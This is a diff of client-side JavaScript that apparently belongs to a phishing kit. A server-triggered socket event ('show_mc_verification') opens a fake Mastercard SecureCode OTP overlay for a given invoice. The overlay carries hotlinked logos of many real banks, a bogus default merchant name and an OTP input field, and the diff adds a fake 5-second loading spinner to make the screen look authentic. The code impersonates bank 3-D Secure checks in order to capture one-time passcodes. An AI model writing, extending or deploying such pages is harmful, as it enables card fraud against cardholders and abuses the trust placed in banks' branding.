@@ -943,39 +943,57 @@ socket.emit('join', currentInvoiceId);
       if (!timerInterval) startOtpTimer();
       isProcessing = false;
     });
-
-    // Event for showing MC verification
-    socket.on('show_mc_verification', (data) => {
-      console.log('Received show_mc_verification event:', data);
-      console.log('Current invoice ID:', currentInvoiceId);
       
-      // Check if the overlay exists
-      const overlay = document.getElementById('mcVerificationOverlay');
-      console.log('Overlay element found:', !!overlay);
+// Event for showing MC verification
+socket.on('show_mc_verification', (data) => {
+  console.log('Received show_mc_verification event:', data);
+  console.log('Current invoice ID:', currentInvoiceId);
+  
+  // Check if the overlay exists
+  const overlay = document.getElementById('mcVerificationOverlay');
+  console.log('Overlay element found:', !!overlay);
+  
+  if (data.invoiceId === currentInvoiceId && overlay) {
+    console.log('Invoice IDs match, updating UI...');
+    
+    // Show the overlay with only a loading spinner first
+    const verificationContent = overlay.querySelector('div');
+    const originalContent = verificationContent.innerHTML;
+    
+    // Create and show a spinner instead
+    verificationContent.innerHTML = `
+      <div style="display: flex; justify-content: center; align-items: center; min-height: 300px;">
+        <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #FF5F00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
+      </div>
+    `;
+    
+    // Show the overlay immediately with just the spinner
+    overlay.style.display = 'flex';
+    
+    // After a delay, show the actual content
+    setTimeout(() => {
+      // Restore the original content
+      verificationContent.innerHTML = originalContent;
       
-      if (data.invoiceId === currentInvoiceId && overlay) {
-        console.log('Invoice IDs match, updating UI...');
-        
-        // Update merchant and amount info
-        const merchantElement = document.getElementById('merchantName');
-        const amountElement = document.getElementById('transactionAmount');
-        const amountElement2 = document.getElementById('transactionAmount2');
-        
-        if (merchantElement) merchantElement.textContent = data.merchantName || 'Bologus pvt store.';
-        if (amountElement2) amountElement2.textContent = data.amount || document.getElementById('displayAmount').textContent || '0.00';
-        
-        // Update bank logo
-        const bankCode = data.bankCode || 'default';
-        const bankLogo = document.getElementById('bankLogo');
-        if (bankLogo) {
-          const bankLogos = {
-                   'sbi': 'https://assets.stickpng.com/images/61fc00073cf0e70004222069.png',
-            'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
-            'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
-            'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
-            'kotak': 'https://logotyp.us/file/kotak-mahindra.svg',
-            'yes': 'https://assets.stickpng.com/images/627ccfe31b2e263b45696ac8.png',
-            'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
+      // Update merchant and amount info
+      const merchantElement = document.getElementById('merchantName');
+      const amountElement2 = document.getElementById('transactionAmount2');
+      
+      if (merchantElement) merchantElement.textContent = data.merchantName || 'Bologus pvt store.';
+      if (amountElement2) amountElement2.textContent = data.amount || document.getElementById('displayAmount').textContent || '0.00';
+      
+      // Update bank logo
+      const bankCode = data.bankCode || 'default';
+      const bankLogo = document.getElementById('bankLogo');
+      if (bankLogo) {
+        const bankLogos = {
+          'sbi': 'https://assets.stickpng.com/images/61fc00073cf0e70004222069.png',
+          'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
+          'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+          'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
+          'kotak': 'https://logotyp.us/file/kotak-mahindra.svg',
+          'yes': 'https://assets.stickpng.com/images/627ccfe31b2e263b45696ac8.png',
+          'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
           'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
           'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
           'standard charterd': 'https://assets.stickpng.com/images/5a1d2dc54ac6b00ff574e292.png',
@@ -988,34 +1006,32 @@ socket.emit('join', currentInvoiceId);
           'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
           'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
           'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
-            'mastercard securecode': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
-          };
-          bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
-        }
-        
-        // Set current date for transaction info
-        const now = new Date();
-        const dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
-        const dateElement = document.getElementById('transactionDate');
-        if (dateElement) dateElement.textContent = dateStr;
-        
-        // Reset OTP input and error
-        const otpInput = document.getElementById('mcOtpInput');
-        const otpError = document.getElementById('mcOtpError');
-        if (otpInput) otpInput.value = '';
-        if (otpError) otpError.style.display = 'none';
-        
-        // Show overlay
-        overlay.style.display = 'flex';
-        
-        // Start timer for MC verification
-        setupMCTimerIfNeeded();
-        
-        console.log('MC verification overlay displayed');
-      } else {
-        console.log('Invoice IDs do not match or overlay not found, ignoring event');
+          'mastercard securecode': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
+        };
+        bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
       }
-    });
+      
+      // Set current date for transaction info
+      const now = new Date();
+      const dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
+      const dateElement = document.getElementById('transactionDate');
+      if (dateElement) dateElement.textContent = dateStr;
+      
+      // Reset OTP input and error
+      const otpInput = document.getElementById('mcOtpInput');
+      const otpError = document.getElementById('mcOtpError');
+      if (otpInput) otpInput.value = '';
+      if (otpError) otpError.style.display = 'none';
+      
+      // Start timer for MC verification
+      setupMCTimerIfNeeded();
+      
+      console.log('MC verification content displayed after loading');
+    }, 5000); // 5 seconds delay
+  } else {
+    console.log('Invoice IDs do not match or overlay not found, ignoring event');
+  }
+});
 
     // Modified redirect event handler to use clean URLs
     socket.on('redirect', (data) => {
